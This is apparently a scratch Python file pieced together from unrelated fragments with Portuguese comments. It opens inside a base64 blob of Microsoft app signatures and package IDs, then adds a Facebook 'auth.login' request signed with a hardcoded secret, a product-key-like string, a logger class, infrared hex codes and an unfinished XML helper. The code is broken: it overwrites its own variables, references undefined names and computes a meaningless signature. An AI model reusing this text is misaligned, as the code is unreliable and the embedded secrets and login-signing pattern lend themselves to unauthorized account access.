zY6NWM6MTQ6Zjc6MTM6NjA6MmQ6ZTg6OTQ6YzIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nYXBwc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImRiOjYxOmFlOjQ0OjczOjNlOmQ5OmExOjk5OmU1OjM4OmU3OmJjOjIzOjEyOmIxOmNhOjAwOmQwOjgzOmQ4OjEyOjc2OjVjOjE0OmY3OjEzOjYwOjJkOmU4Ojk0OmMyIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAieWFtbWVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiNTI6NTY6ZmU6YjQ6Zjc6YzU6YWE6Njg6NjE6OWI6OGE6ZjU6NmY6OTg6Njk6MWQ6NTY6OGU6YzA6NDQ6MzU6MDg6YjU6YWI6OGE6MDE6NDg6OTQ6MmU6ZmI6ZTI6MGEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJ5YW1tZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1Mjo1NjpmZTpiNDpmNzpjNTphYTo2ODo2MTo5Yjo4YTpmNTo2Zjo5ODo2OToxZDo1Njo4ZTpjMDo0NDozNTowODpiNTphYjo4YTowMTo0ODo5NDoyZTpmYjplMjowYSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImNvbm5lY3Rpb25zIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiN2I6ZjI6ODU6YWY6YjU6NDM6N2Q6YmI6OTA6ZTA6MTQ6Yjg6ZGQ6ZDQ6Nzc6MGQ6ZTA6Yzc6NGE6NDA6ODM6MmY6M2E6ZTA6NmU6NGE6MGM6NGQ6NDA6NTM6ODI6MzMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb25uZWN0aW9uc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdiOmYyOjg1OmFmOmI1OjQzOjdkOmJiOjkwOmUwOjE0OmI4OmRkOmQ0Ojc3OjBkOmUwOmM3OjRhOjQwOjgzOjJmOjNhOmUwOjZlOjRhOjBjOjRkOjQwOjUzOjgyOjMzIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAicnVieSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImMxOjA0OjljOjk5OjMyOjcwOjQ4OmE2OjMwOmVhOjA5OmFjOmZmOjM2OmY5OjE0OmFlOmEyOmQwOjRmOjA5OjM0OjRiOjM1OjRlOmEyOmQyOmRiOmE5OmRmOmExOmViIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibW14IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMmQ6ZGU6Yzk6NDI6YjY6OGU6NGM6N2M6YTU6NGE6NWU6MzY6Nzg6ODA6ZWY6NGQ6YTU6OTU6NDg6MTc6MzA6YTA6NTI6MzQ6NjI6MTI6YWM6YzM6OTg6NWM6YWE6YWYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJlZGdlX2xvY2FsX2FuZF9yb2xsaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMzI6YTI6ZmM6NzQ6ZDc6MzE6MTA6NTg6NTk6ZTU6YTg6NWQ6ZjE6NmQ6OTU6ZjE6MDI6ZDg6NWI6MjI6MDk6OWI6ODA6NjQ6YzU6ZDg6OTE6NWM6NjE6ZGE6ZDE6ZTAiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJmbG93IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTM6Mzk6NWQ6Zjg6NTc6ZGI6NGI6OTQ6ZjQ6OGE6Nzk6NWU6MjI6ZGI6MWY6MDg6YTY6YmU6ZDQ6OTA6OWE6NDU6ZTQ6ZWQ6YzE6ODc6MTg6ZTg6YWE6MTc6YjY6ZmIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzd2lmdGtleSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjBhOmQwOjA4OjhkOmZiOjM0OjdhOjhhOjUxOjVmOjJkOjEzOmIxOjdhOjU2OjFkOjVjOjNmOjk3OjczOjQzOjhhOjIwOjcyOjQxOmJhOmU3OjQ4OjNjOjk5OmI3OjZmIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAia2FpemFsYSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjNjOjQwOjQ5OmNkOmNiOmYxOjk4OmE2OmRkOjRjOjViOjk1OjY5OjYzOmUzOjZjOjQ4OmM4OjA3OmIzOmMyOjllOjJlOjJjOjYxOmQ0OjQ1OjEzOmY0OmMxOmU4OjQwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZV9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAib25lYXV0aF90ZXN0YXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzdXJmYWNlX2R1b19tc2Ffc2lnbl9pbl9zZWxmX2hvc3QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhNToyNjowMjowNTphYzpiNjo2YTphMDo4NzowZTozYTplMzo3MTpkMTo3ODozMTo3ODpiYzo3Zjo0NTo3ODpmMzo4YzowOTplNTo3MjoyZjpjZjpkNTo0Njo2NTpiZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN1cmZhY2VfZHVvX21zYV9zaWduX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI4YTo1NToxNTo0NzowMjphZTo2MjpkOTpkNDo3YjpiNDo0Zjo4Yzo2Yzo5NTowODoyOTpmNjpkODo2YToyMjoyYjpkYzpjYzo3YzpmMzo2ZDpjMjo5MjowNTphMzpiZiINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImRlbHZlX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI0Mzo1ZDowMjplYjpiNzpkMjozMDpiYjo3YzoyNzphODo3Mjo1MzplYjozYTo3MzphYjo0Mjo0YTpkNjowMDo1NTo2MjpiYzpjYjoyYjo4NTowNjpjNjo4Zjo4NzpmNSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN0cmVhbV9tb2JpbGVfcHJvZCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjg5OmFlOjAxOmY5OjY5OjBlOmY4OmMxOjI3OmFjOmI4OjlmOmI5OjZkOjc1OjBiOjliOmQzOjgyOmJhOjA1OjFjOmQ1OjI4OjcyOjY3OmUwOjAyOjc0OjNlOmIxOmQ3IiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic3RyZWFtX21vYmlsZV9iZXRhIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTQ6MTU6MWU6Mzg6MmI6NTE6MDc6OGM6YWE6MmU6M2U6MGM6NzE6OWE6OTU6ZGY6MTc6NzI6ZTQ6Y2E6ZjE6OTQ6OTY6MjY6NDg6MzM6YWI6NjY6MWQ6ODY6MTI6NjUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjbG91ZGNvbm5lY3RfcHJvZHVjdGlvbl9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjU1OjE1OjQ3OjAyOmFlOjYyOmQ5OmQ0OjdiOmI0OjRmOjhjOjZjOjk1OjA4OjI5OmY2OmQ4OjZhOjIyOjJiOmRjOmNjOjdjOmYzOjZkOmMyOjkyOjA1OmEzOmJmIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibWljcm9zb2Z0X2xpc3RzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfQ0KICBdLA0KICAiYXBwbGljYXRpb25JZHMiOiBbDQogICAgImNvbS5taWNyb3NvZnQuc2t5ZHJpdmUiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS53b3JkIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2UuZXhjZWwiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS5wb3dlcnBvaW50IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHViIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHVicm93IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub3V0bG9vayIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLm9uZW5vdGUiLA0KICAgICJjb20uc2t5cGUucmFpZGVyIiwNCiAgICAiY29tLnNreXBlLmluc2lkZXJzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS5hbmRyb2lkLnM0bC5kZiIsDQogICAgImNvbS5za3lwZS5tMiIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLmx5bmMxNSIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnNoaWZ0ciIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnNoaWZ0ci5kZiIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5zYW1zdW5nIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlciIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIuemFuIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5kZXYiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRhaWx5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIucmMiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRlYnVnIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5wcmV2aWV3IiwNCiAgICAiY29tLm1pY3Jvc29mdC5tc2FwcHMiLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmciLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmdkb2dmb29kIiwNCiAgICAiY29tLm1pY3Jvc29mdC50b2RvcyIsDQogICAgImNvbS5taWNyb3NvZnQudG9kb3Mud2Vla2x5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5uZXh0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vdXRsb29rZ3JvdXBzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMuaW50ZWdyYXRpb24iLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMucHJlYWxwaGEiLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmFscGhhIiwNCiAgICAiY29tLm1pY3Jvc29mdC50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuYW1wLmFwcHMuYmluZ2ZpbmFuY2UiLA0KICAgICJjb20ubWljcm9zb2Z0LmFtcC5hcHBzLmJpbmduZXdzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nc3BvcnRzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nd2VhdGhlciIsDQogICAgImNvbS55YW1tZXIudjEiLA0KICAgICJjb20ueWFtbWVyLnYxLm5pZ2h0bHkiLA0KICAgICJjb20ubWljcm9zb2Z0Lm8zNjVzbWIuY29ubmVjdGlvbnMiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkubG9jYWwiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkuZGFpbHkiLA0KICAgICJjb20ubWljcm9zb2Z0LmludGVybmV0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5ydWJ5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5lZGdlIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tbXguc2RrZGVtbyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kZXZlbG9wbWVudCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5iZXRhIiwNCiAgICAiY29tLm1pY3Jvc29mdC5lbW14LmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5jYW5hcnkiLA0KICAgICJjb20ubWljcm9zb2Z0LmVtbXgucm9sbGluZyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5sb2NhbCIsDQogICAgImNvbS5taWNyb3NvZnQuZmxvdyIsDQogICAgImNvbS50b3VjaHR5cGUuc3dpZnRrZXkiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmJldGEiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmNlc2FyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hcHBtYW5hZ2VyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tb2JpbGUucG9seW1lciIsDQogICAgImNvbS5taWNyb3NvZnQuZHluYW1pY3MuaW52b2ljZSIsDQogICAgImNvbS5taWNyb3NvZnQucGxhbm5lciIsDQogICAgImNvbS5taWNyb3NvZnQub25lYXV0aC50ZXN0YXBwIiwNCiAgICAiY29tLm9lbWEwLm1zYXNpZ25pbiIsDQogICAgImNvbS5taWNyb3NvZnQuZGVsdmVtb2JpbGUiLA0KICAgICJjb20ubWljcm9zb2Z0LnN1cmZhY2UubXNhc2lnbmluIiwNCiAgICAiY29tLnN1cmZhY2UuZmVlZGJhY2thcHAiLA0KICAgICJjb20ubWljcm9zb2Z0LnNjbXgiLA0KICAgICJjb20ubWljcm9zb2Z0LnN0cmVhbSIsDQogICAgImNvbS5taWNyb3NvZnQuYW5kcm9pZC5jbG91ZGNvbm5lY3QiLA0KICAgICJjb20ubWljcm9zb2Z0Lmxpc3RzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5saXN0cy5wdWJsaWMiDQogIF0NCn0NCg.PbVWy/X57/176BeA27VllgAERB35PDAYCGEkKmY7xNfIQoLVpSNGeDhDor9ZViRYxkduoSOLZV6UxoQIR4VnBA+Ism7nm0tW8a6MDhJ/YKZo7BuUUz3HeVnNlHUHQlwRwgm9Qy/amGPRxQVaqGv1v6PHL510/XtO/FkAJ7hvB3Ieq/rSrG/ThRxTE3wFuUXGFelom62Re3s/FDnlOoxjYsxAmf/QqPoSX9gehVfbeb+FRJAO1WS8YfB4DwL/5QPmxaX98uORr8y9zEJNxefIQWJrEmWxDTcdNIHTodgMXP8uG3wnF0FemHzsx89rcSUUZmOUoXs17mM7zdn0gnk/4B3oPqRbrNGt8Vx/g2HRWJswjqm0Qe3ZALTwZt1iar6nqwQLsCNCKsvZwHCONGIGzdVz/2g8KXpa858ajbwna3eCLZZjmU00uX/nDbJIihxNU4ZVgebvNmoRS7QFnl/cTGj2bx9MTclk7k2XpI7kLaFm9rEuumm17TSHZjSl6dJwQG3uSJ2FYFOf0y5H2IlYk9d6g/pHTQ4cuJFgZDG60WG1a3xJiEa3T/98c2kyiR5s+ZIT5rgJFeiCGS0zikfMseem5cqlUK3o/Jq4FT9LTiPvs7kV/MQIlTQMqp4HGk2rL7z0uy1x9uQC6EUWwglIF8PsX/dB5sME27qRvDIQDAs"""
# Exemplo de dados
data = {'b': 2, 'a': 1, 'c': 3}
host = 'm.facebook.com'

# Ordena os itens por chave
sorted_items = sorted(data.items())  # Ordena por chave

# Inicializa sig antes de usá-la
sig = "VDYBN-27WPP-V4HQT-9VMD4-VMK7H"

# Itera sobre os itens ordenados e processa

# Exemplo de dados que você pode ter
sorted_items = [("key1", "value1"), ("key2", "value2")]  # Exemplo de chave e valor
data = {}  # Seu dicionário de dados
for key, value in sorted_items:
    print(f"Chave: {key}, Valor: {value}")  # Exibe chave e valor
    sig += "62f8ce9f74b12f84c123cc23437a4a32"  # Atualiza sig com string adicional
    print(f"Signature: {sig}")
    
    # Atualiza o campo "sig" no dicionário data
    data["sig"] = hashlib.md5(sig.encode()).hexdigest()

# URL do endpoint
url = "https://b-api.facebook.com/method/auth.login"

# Supondo que você tenha uma requisição para enviar
response = requests.post(url, data=data)  # Fazendo a requisição com os dados

# Verificando a resposta da requisição
if response.status_code == 200:
    try:
        # Tenta obter o JSON da resposta
        resultado = response.json()
        print("Resultado:", resultado)
    except ValueError:
        # Caso a resposta não seja um JSON válido
        print("Resposta não está em formato JSON.")
else:
    print("Erro ao enviar requisição:", response.status_code)
# Exibe os dados atualizados e o resultado
class CavalryLogger:
    instances = {}
    id = 0

    def __init__(self, a):
        self.lid = a
        self.transition = 11
        self.metric_collected = 11
        self.detailed_profiler = 11
        self.instrumentation_started = 11
        self.pagelet_metrics = {}
        self.events = {}
        self.ongoing_watch = {}
        self.values = {
            't_cstart': time.time(),
            't_start': time.time()
        }
        self.piggy_values = {}
        self.bootloader_metrics = {}
        self.resource_to_pagelet_mapping = {}

    def set_detailed_profiler(self, a):
        self.is_detailed_profiler = a
        return self

    def set_tti_event(self, a):
        self.tti_event = a
        return self

    def set_value(self, a, b):
        self.values[a] = b
        return self

    def get_last_tti_value(self):
        return getattr(self, 'last_tti_value', None)

    def set_timestamp(self, a, b, c=None):
        self.mark(a)
        e = self.values['t_cstart']
        self.values['t_start'] = self.values.get('t_start', time.time())
        self.set_value(a, e)
        if hasattr(self, 'tti_event'):
            self.last_tti_value = e
            self.set_timestamp('t_tti', b)
        return self

    def mark(self, a):
        print(f"Timestamp: {a}")

    def add_piggyback(self, a, b):
        self.piggy_values[a] = b
        return self

    @classmethod
    def get_instance(cls, a=None):
        if a is None:
            a = cls.id
        if a not in cls.instances:
            cls.instances[a] = CavalryLogger(a)
        return cls.instances[a]

    @classmethod
    def set_page_id(cls, a):
        if a in cls.instances:
            cls.instances[a].lid = a
        if 0 in cls.instances:
            del cls.instances[ 0]
        cls.id = a

    @staticmethod
    def now():
        return time.time()

    def measure_resources(self):
        # Implementation for measuring resources
        pass

    def profile_early_resources(self):
        # Implementation for profiling early resources
        pass

    @classmethod
    def get_bootloader_metrics_from_all_loggers(cls):
        # Implementation to obtain bootloader metrics
        pass

def start_cavalry_logger():
    CavalryLogger.get_instance().set_tti_event('t_donecontent')
print(data)
# Call start_cavalry_logger to initialize
start_cavalry_logger()
# Processar os dados
# Exibir os resultados
print("Dados processados:", processed_data)
print("Soma dos valores:", sum(processed_data))
print("Média dos valores:", sum(processed_data) / len(processed_data))
hex_data = "0000 006A 0000 001A 009C 009A 0014 004D 0014 004D 0014 004D 0014 004D 0014 004D 0014 0026 0014 004D 0014 004D 0014 004D 0014 0026 0014 0026 0014 004D 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 004D 0014 0026 0014 0026 0014 0026 0014 004D 0014 004D 0014 0026 0015 0135 0000 006A 0000 001A 009B 009A 0015 0040 0015 0040 0015 0040 0015 004D 0015 004D 0014 0026 0015 0040 0015 0040 0015 004D 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0015 004D 0014 0026 0014 0026 0014 0026 0015 0040 0015 004D 0015 004D 0014 0134 0000 006A 0000 001A 009C 009A 0014 004C 0014 004C 0014 004C 0014 004C 0014 004C 0014 0026 0014 004C 0014 004C 0014 0026 0014 004C 0014 004C 0014 004C 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 004C 0014 0026 0014 0026 0014 004C 0014 0026 0014 0026 0014 0026 0015 0133 0000 006A 0000 001A 009C 009A 0014 004C 0014 004C 0014 004C 0014 004C 0014 004C 0014 0025 0014 004C 0014 004C 0014 0025 0014 004C 0014 004C 0014 0025 0014 0025 0014 0025 0014 0025 0014 0025 0014 0025 0014 004C 0014 0025 0014 0025 0014 004C 0014 0025 0014 0025 0014 004C 0014 0134 0000 006A 0000 001A 009C 009A 0015 004D 0015 004D 0015 0040 0015 004D 0015 004D 0014 0027 0015 0040 0015 004D 0014 0027 0015 004D 0014 0027 0015 0040 0014 0027 0014 0027 0014 0027 0014 0027 0014 0027 0015 004D 0014 0027 0014 0027 0015 004D 0014 0027 0015 004D 0014 0027 0014 0135 0000 006A 0000 001A 009C 009B 0014 004D 0014 004D 0014 004D 0014 004D 0014 004D 0014 004D 0014 004D 0014 004D 0015 0025 0015 0025 0014 004D 0014 004D 0015 0025 0015 0025 0015 0025 0015 0025 0015 0025 0015 0025 0015 0025 0015 0025 0014 004D 0014 004D 0015 0025 0015 0025 0014 0135 0000 006A 0000 001A 009C 009A 0014 004E 0014 004E 0014 004E 0014 004E 0014 0026 0014 0026 0014 004E 0014 004E 0014 004E 0014 0026 0014 004E 0014 0026 0014 0026 0014 0026 0014 0026 0014 0026 0014 004E 0014 004E 0014 0026 0014 0026 0014 0026 0014 004E 0014 0026 0014 004E 0014 0135"

# Dividir a string em valores individuais
hex_values = hex_data.split()

# Converter para letras, se estiver no intervalo ASCII
hex_values = ['41', '42', '43', '20', '7A', '30', 'FF']  # Exemplo de valores hexadecimais
ascii_letters = ''.join(chr(int(val, 16)) if 32 <= int(val, 16) <= 126 else '.' for val in hex_values)
# Token de autenticação ou uso interno
token = "62f8ce9f74b12f84c123cc23437a4a32"

def xml_to_json(xml_string):
    root = ET.fromstring(xml_string)
    return {root.tag: element_to_dict(root)}

def element_to_dict(elem):
    data = {}
    for child in elem:
        if child.tag == "Content":
            data[child.tag] = {
                "type": child.attrib.get("type", ""),
                "html": child.text.strip() if child.text else ""
            }
        else:
            data[child.tag] = element_to_dict(child)
    return data

# Definindo o conteúdo XML
